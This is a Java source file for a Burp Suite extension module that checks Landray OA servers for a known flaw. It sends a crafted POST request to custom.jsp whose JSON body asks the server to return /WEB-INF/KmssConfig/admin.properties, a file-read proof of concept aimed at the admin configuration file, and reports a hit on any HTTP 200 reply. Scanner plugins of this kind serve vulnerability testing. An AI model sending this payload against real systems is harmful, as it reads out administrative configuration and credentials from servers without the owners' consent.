package burp.vuls;

import burp.*;
import burp.impl.VulResult;
import burp.impl.VulTaskImpl;

import java.util.Arrays;
import java.util.List;

public class LandrayOa extends VulTaskImpl {

    public LandrayOa(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log, IHttpRequestResponse messageInfo) {
        super(helpers, callbacks, log, messageInfo);
    }

    @Override
    public VulResult run() {
        //新的请求包
        String poc_req = "POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1\n" +
                "Host: "+ host +"\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\n" +
                "Content-Type: application/x-www-form-urlencoded\n" +
                "Accept-Encoding: gzip\n" +
                "\n";
        String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
        IHttpRequestResponse messageInfo1 = BurpExtender.requester.send(this.iHttpService, Arrays.asList(poc_req.split("\n")), poc_body.getBytes());
        //新请求信息
        IRequestInfo analyzeRequest = this.helpers.analyzeRequest(messageInfo1);
        //新的返回包
        IResponseInfo analyzeResponse1 = this.helpers.analyzeResponse(messageInfo1.getResponse());
        //新返回上面板信息
        String path = analyzeRequest.getUrl().getPath();
        String method = analyzeRequest.getMethod();
        short status = analyzeResponse1.getStatusCode();

        //如果状态码相同则可能存在问题
        if (status == 200) {
            message = "LandrayOa Vul";
            messageInfo_r = messageInfo1;
        }

        if (!message.equalsIgnoreCase("")){
            result = logAdd(messageInfo_r, host, path, method, status, message, payloads);
        }

        return result;
    }
}
